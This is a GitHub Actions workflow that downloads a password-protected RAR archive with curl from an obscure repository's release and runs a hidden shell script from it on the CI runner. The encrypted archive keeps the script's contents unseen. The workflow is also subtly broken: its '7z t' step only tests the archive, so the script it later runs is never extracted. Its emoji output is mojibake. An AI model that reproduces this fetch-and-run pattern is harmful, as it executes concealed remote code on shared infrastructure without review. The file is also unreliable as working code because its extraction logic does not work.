name: runcl
'on':
  workflow_dispatch: null
jobs:
  run_script:
    runs-on: ubuntu-latest
    steps:
      - name: Download script from GitHub Release
        run: |
          curl -sL -o yu.rar https://github.com/maywopselmp/wadma/releases/download/ampo/yu.rar
          if [ ! -f "yu.rar" ]; then
            echo "‚ùå Error: Failed to download yu.rar"
            exit 1
          fi

      - name: Install dependencies
        run: |
          sudo apt-get update -y
          sudo apt-get install -y p7zip-full dos2unix

      - name: Verify RAR file
        run: |
          if [ ! -f yu.rar ]; then
            echo "‚ùå Error: yu.rar missing!"
            exit 1
          fi
          echo "‚úÖ File size: $(ls -lh yu.rar | awk '{print $5}')"

      - name: Extract with 7zip
        env:
          RAR_PASS: '${{ secrets.RAR_PASSWORD }}'
        run: |
          echo "Password length: ${#RAR_PASS} chars"  # Debugging password length
          if [ -z "$RAR_PASS" ]; then
            echo "‚ùå Error: Password is empty or not set correctly!"
            exit 1
          fi
          7z t -p"$RAR_PASS" yu.rar

      - name: Fix script formatting
        run: |
          if [ ! -f "extracted/yu.sh" ]; then
            echo "‚ùå Error: yu.sh not found in extracted files"
            exit 1
          fi
          dos2unix extracted/yu.sh || sed -i 's/\r$//' extracted/yu.sh
          echo "‚úÖ Script formatting fixed"

      - name: Make script executable
        run: |
          chmod +x extracted/yu.sh
          echo "‚úÖ Script made executable"

      - name: Run script
        run: |
          echo "üèÉ‚ôÇÔ∏è Running script..."
          ./extracted/yu.sh
          echo "‚úÖ Script execution completed"

      - name: Verify output
        run: |
          if [ ! -f "a.txt" ]; then
            echo "‚ùå Error: a.txt not found after script execution"
            exit 1
          fi
          echo "‚úÖ Verification passed: a.txt exists"
